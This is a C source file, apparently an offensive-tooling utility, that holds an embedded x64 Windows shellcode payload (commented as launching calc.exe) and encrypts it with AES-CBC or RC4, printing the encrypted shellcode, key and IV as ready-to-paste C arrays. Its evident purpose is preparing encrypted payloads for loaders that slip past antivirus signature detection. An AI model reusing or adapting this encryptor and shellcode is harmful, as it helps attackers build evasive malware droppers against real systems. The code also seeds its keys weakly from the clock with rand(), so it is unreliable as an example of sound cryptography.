#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#include "common.h"
#include "aes.h"

void genRandomBytes(unsigned char key[], size_t keySize){
	for(int i=0;i<keySize;i++){
		key[i] = (unsigned char)rand() % 0xFF;
	}

}

void printHex(unsigned char* varName, unsigned char data[], size_t dataSize){
    printf("unsigned char %s[%d] = {", varName, dataSize);

    for(int i=0;i<dataSize;i++){
        if(i%16 == 0)
            printf("\n\t");
        if(i<dataSize-1)
            printf("0x%0.2X, ", data[i]);
        else    
            printf("0x%0.2X", data[i]);
    }   
    printf("\n};\n\n");
}

int padding(unsigned char shellcode[], size_t shellcodeSize, unsigned char **newBuffer, size_t *newBufferSize, int paddingInt){
	size_t paddingSize;

	paddingSize = shellcodeSize + paddingInt - (shellcodeSize % paddingInt);
	*newBuffer = (unsigned char *)malloc(sizeof(unsigned char)*paddingSize);

	if(*newBuffer == NULL){
		printf("[+] error malloc\n");
		return 1;
	}

	memset(*newBuffer, 0, paddingSize);
	memcpy(*newBuffer, shellcode, shellcodeSize);

	*newBufferSize = paddingSize;

	return 0;
}

void menu(){
    printf("usage: ./aes_rc4.c option\n");
    printf("Options:\n");
    printf("    -h or --help    Display this menu\n");
    printf("    aes             encrypt data using AES algorithm\n");
    printf("    rc4             encrypt data using RC4 algorithm\n");
    printf("\n");
}

//calc.exe
unsigned char shellcode[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00, 0x00, 0x00, 0x00
};

unsigned char rc4Key[RC4KEYSIZE];
unsigned char *shellcodeRC4 = NULL;

int main(int argc, char *argv[]){

    if(argc != 2){
        menu();
        return 0;
    }
    

    if( (strcmp(argv[1], "--help") == 0) || (strcmp(argv[1], "-h") == 0) ){
        menu();
        return 0;
    }

    if(strcmp(argv[1], "aes") == 0){

        unsigned char *bufferShellcode = shellcode;
	    size_t bufferSize = sizeof(shellcode);
        
        unsigned char aesKey[AESKEYSIZE];
		unsigned char aesIV[AESIVSIZE];
		unsigned char *output = NULL;

		struct AES_ctx ctx;

		srand(time(NULL));
		genRandomBytes(aesKey, AESKEYSIZE);

		srand(time(NULL)^aesKey[0]);
		genRandomBytes(aesIV, AESIVSIZE);

		printHex("aesKey", aesKey, AESKEYSIZE);
		printHex("aesIV", aesIV, AESIVSIZE);

		AES_init_ctx_iv(&ctx, aesKey, aesIV);
		if (bufferSize %16 != 0){
			printf("[+] payload needs to be padded\n");
			padding(shellcode, sizeof(shellcode), &bufferShellcode, &bufferSize, 16);
		}
		AES_CBC_encrypt_buffer(&ctx, bufferShellcode, bufferSize);
		printHex("shellcodeAES", bufferShellcode, bufferSize);

    }

    else if(strcmp(argv[1], "rc4") == 0){
        srand(time(NULL));
        genRandomBytes(rc4Key, RC4KEYSIZE);
        printHex("rc4KEY", rc4Key, RC4KEYSIZE);

        rc4Encryption(shellcode, sizeof(shellcode), rc4Key, RC4KEYSIZE, &shellcodeRC4);
        printHex("shellcode", shellcodeRC4, sizeof(shellcode));

    }

    else{
        menu();
    }


    return 0;
}